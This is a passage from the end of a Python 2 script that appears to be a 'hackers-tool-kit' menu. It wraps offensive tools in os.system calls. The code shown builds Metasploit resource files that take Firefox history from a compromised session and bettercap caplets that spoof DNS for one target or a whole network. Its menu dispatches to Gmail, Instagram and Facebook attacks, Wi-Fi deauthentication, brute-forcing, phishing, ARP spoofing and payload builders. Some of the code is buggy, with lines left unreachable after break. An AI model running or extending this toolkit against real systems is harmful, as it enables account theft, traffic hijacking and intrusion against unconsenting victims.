		os.system("service postgresql restart")
		os.system('msfconsole -r pyload.rc')
		os.system('rm -rf pyload.rc')
	if yn == "n":
		os.system('echo " "')
#----------#
#PYLOAD END#


#FOXHIS START#
#------------#
def foxhis():
	os.system('echo "sessions\n" >> foxhisses.rc')
	os.system('echo "exit\n" >> foxhisses.rc')
	os.system("service postgresql restart")
	os.system('msfconsole -q -r foxhisses.rc')
	os.system('rm -rf foxhisses.rc')
	print "\n"
	ses = raw_input("Session: ")
	print "\nMaximum time (seconds) to wait for a response\n"
	time = raw_input("Timeout: ")
	os.system('echo "use firefox/gather/history\n" >> foxhis.rc')
	os.system('echo "set session {0}\n" >> foxhis.rc'.format(ses))
	os.system('echo "set timeout {0}\n" >> foxhis.rc'.format(time))
	os.system('echo "run\n" >> foxhis.rc')
	os.system('msfconsole -q -r foxhis.rc')
	os.system('rm -fr foxhis.rc')
#----------#
#FOXHIS END#


#RHAWK START#
#-----------#
def rhawk():
	os.system("cd /root/hackers-tool-kit/redhawk/ && php rhawk.php")
#---------#
#RHAWK END#


#NANO START#
#----------#
def nano():
	print "opening nano in \033[93m/root/\033[0m folder"
	os.system("sleep 2")
	os.system("cd /root/ && nano")
#--------#
#NANO END#


#UPDATE HACKERS-TOOL-KIT START#
#-----------------------------#
def update():
	os.system("cd /root/hackers-tool-kit/ && python htkupdate.py")
#---------------------------#
#UPDATE HACKERS-TOOL-KIT END#

#COMPILE C START#
#---------------#
def compilec():
	print "filename / filepath"
	r = raw_input("> ")
	print "\nfilename2 / filepath2"
	h = raw_input("> ")

	a = 'g++ {0} -o {1}'.format(r,h)
	os.system(a)
#COMPILE C END#
#-------------#

#DNS SPOOF START#
#---------------#
def dnsspoof():
	target = raw_input("\033[1mTarget:\033[0m ")
	domain1 = raw_input("\033[1mDomain1:\033[0m ")
	domain2 = raw_input("\033[1mDomain2:\033[0m ")
	os.system('echo "net.sniff on\n" >> dns.cap')
	os.system('echo "set dns.spoof.domains {0},{1}\n" >> dns.cap'.format(domain1,domain2))
	os.system('echo "set dns.spoof.address {0}\n" >> dns.cap'.format(target))
	os.system('echo "dns.spoof on\n" >> dns.cap')
	print '\n\033[93mto stop type "exit"\033[0m'
	os.system("sleep 2")
	os.system("bettercap -no-history -caplet dns.cap")
	os.system("rm dns.cap")

def dnsspoofall():
	domain1 = raw_input("\033[1mDomain1:\033[0m ")
	domain2 = raw_input("\033[1mDomain2:\033[0m ")
	os.system('echo "net.sniff on\n" >> dnsall.cap')
	os.system('echo "set dns.spoof.domains {0},{1}\n" >> dnsall.cap'.format(domain1,domain2))
	os.system('echo "set dns.spoof.all true\n" >> dnsall.cap')
	os.system('echo "dns.spoof on\n" >> dnsall.cap')
	print '\n\033[93mto stop type "exit"\033[0m'
	os.system("sleep 2")
	os.system("bettercap -no-history -caplet dnsall.cap")
	os.system("rm dnsall.cap")


#-------------#
#DNS SPOOF END#


#REBOOT HTK START#
#----------#
def reboot():
	python = sys.executable
	os.execl(python, python, * sys.argv)
	curdir = os.getcwd()
#--------------#
#REBOOT HTK END#


#THIS IS THE MAIN PART OF THE SCRIPT LIKE WHERE YOU TYPE WHERE IT RUNS THE COMMANDS SHIT LIKE THAT#
#-------------------------------------------------------------------------------------------------#
def main():
	found = False
	while not found:
		try:
			x = raw_input(N+'\033[91m[\033[0mh-\033[94mT\033[0m-k\033[91m]\033[94m->\033[92m: \033[0m')
			if x == "?":
				help()
			if x == "winload" :
				winload()
			if x == "clear" :
				os.system("clear")
			if x == "andload":
				andload()
			if x == "command":
				c = raw_input("Command: ")
				os.system(c)
			if x == "msfcon" :
				os.system("service postgresql start")
				os.system("msfconsole")
			if x == "set":
				os.system("setoolkit")
			if x == "msfven":
				print R+"!ONLY TYPE THE ARGUMENTS DONT TYPE MSFVENOM\033[0m"
				v = raw_input(G+"MSFVENOM: \033[0m")
				os.system("msfvenom", v)
			if x == "gmail" :
				gmail()
			if x == "insta":
				insta()
			if x == "fb" :
				fb()
			if x == "ipgrab":
				ipgrab()
			if x == "myip":
				myip()
			if x == "wifite":
				wifite()
			if x == "mon" :
				mon()
			if x == "netdev" :
				netdev()
			if x == "scannet":
				scannet()
			if x == "exit":
				print "\nfollow @tuf_unkn0wn on instagram"
				print "\nExiting..."
				break
				os.system("service tor stop")
				os.system("service postgresql stop")
				sys.exit()
			if x == "rebootl":
				print R+"! ARE YOU SURE YOU WANT TO REBOOT YOUR WHOLE DEVICE !\033[0m"
				c = raw_input("[y/n]> ")
				if c == "y" :
					os.system("reboot")
				if c == "n" :
					os.system("clear")
					mainbanner()
					main()
			if x == "port":
				port()
			if x == "info":
				info()
			if x == "sysinfo":
				sysinfo()
			if x == "msfex":
				msfex()
			if x == "udp":
				udp()
			if x == "tcp":
				tcp()
			if x == "syn":
				syn()
			if x == "msfpa":
				msfpa()
			if x == "msfau":
				msfau()
			if x == "ping" :
				ping()
			if x == "multih":
				multih()
			if x == "msfall":
				msfall()
			if x == "hydra" :
				hydra()
			if x == "cupp":
				cupp()
			if x == "vdir":
				vdir()
			if x == "monoff":
				monoff()
			if x == "vpn":
				vpn()
			if x == "vpnoff":
				vpnoff()
			if x == "slowl":
				slowl()
			if x == "pidox":
				pidox()
			if x == "specnet":
				specnet()
			if x == "pingen":
				pingen()
			if x == "reaver":
				reaver()
			if x == "deauth":
				deauth()
			if x == "macc":
				macc()
			if x == "macoff":
				macoff()
			if x == "arpspoof":
				arpspoof()
			if x == "sslscan":
				sslscan()
			if x == "payload":
				payload()
			if x == "crunch":
				crunch()
			if x == "traff":
				traff()
			if x == "resa":
				resa()
			if x == "resu":
				resu()
			if x == "hashid":
				hashid()
			if x == "restart":
				restart()
			if x == "medusa":
				medusa()
			if x == "wafwoof":
				wafwoof()
			if x == "cloud":
				cloud()
			if x == "brutex":
				brutex()
			if x == "methelp":
				methelp()
			if x == "winbyp":
				winbyp()
			if x == "exploit":
				exploit()
			if x == "phish":
				phish()
			if x == "datalist":
				datalist()
			if x == "msfev":
				msfev()
			if x == "upgrade":
				upgrade()
			if x == "nscript":
				nscript()
			if x == "sshver":
				sshver()
			if x == "chains":
				chains()
			if x == "mysqlv":
				mysqlv()
			if x == "connect":
				connect()
			if x == "terminal":
				terminal()
			if x == "aircrack":
				aircrack()
			if x == "source":
				source()
			if x == "dirscan":
				dirscan()
			if x == "aserver":
				aserver()
			if x == "clearall":
				clearall()
			if x == "run":
				run()
			if x == "banner":
				banner()
			if x == "phpload":
				phpload()
			if x == "pyload":
				pyload()
			if x == "foxhis":
				foxhis()
			if x == "rhawk":
				rhawk()
			if x == "nano":
				nano()
			if x == "update":
				update()
			if x == "compilec":
				compilec()
			if x == "dnsspoof":
				dnsspoof()
			if x == "dnsspoofall":
				dnsspoofall()
			if x == "htk-lite":
				os.system("python /root/hackers-tool-kit/htk-lite/htkl.py")
			if x == "reboot":
				reboot()
		except:
			print "\nfollow @tuf_unkn0wn on instagram"
			print "\nExiting..."
			break
			os.system("service tor stop")
			os.system("service postgresql stop")
	found = True

mainbanner()
main()
#-------------------------------------------------------------------------------------------------#
#THIS IS THE MAIN PART OF THE SCRIPT LIKE WHERE YOU TYPE WHERE IT RUNS THE COMMANDS SHIT LIKE THAT#
